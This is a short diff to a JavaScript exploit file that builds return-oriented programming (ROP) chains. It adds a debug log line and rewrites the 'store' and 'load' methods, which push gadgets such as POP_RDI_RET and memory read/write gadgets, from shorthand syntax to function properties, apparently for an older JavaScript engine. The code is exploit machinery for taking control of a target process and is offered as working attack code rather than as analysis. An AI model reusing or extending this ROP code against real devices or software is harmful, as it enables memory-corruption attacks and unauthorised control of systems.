@@ -646,6 +646,7 @@ var rop = {
   fake: undefined,
   init: function (addr) {
     log('Initiate ROP...')
+    log('DEBUG: rop.store type = ' + typeof this.store)
 
     gadgets.init(addr)
 
@@ -731,12 +732,12 @@ var rop = {
 
     return fake
   },
-  store (insts, addr, index) {
+  store: function (insts, addr, index) {
     insts.push(gadgets.POP_RDI_RET)
     insts.push(addr.add(index * 8))
     insts.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET)
   },
-  load (insts, addr, index) {
+  load: function (insts, addr, index) {
     insts.push(gadgets.POP_RDI_RET)
     insts.push(addr.add(index * 8))
     insts.push(gadgets.MOV_RAX_QWORD_PTR_RDI_RET)
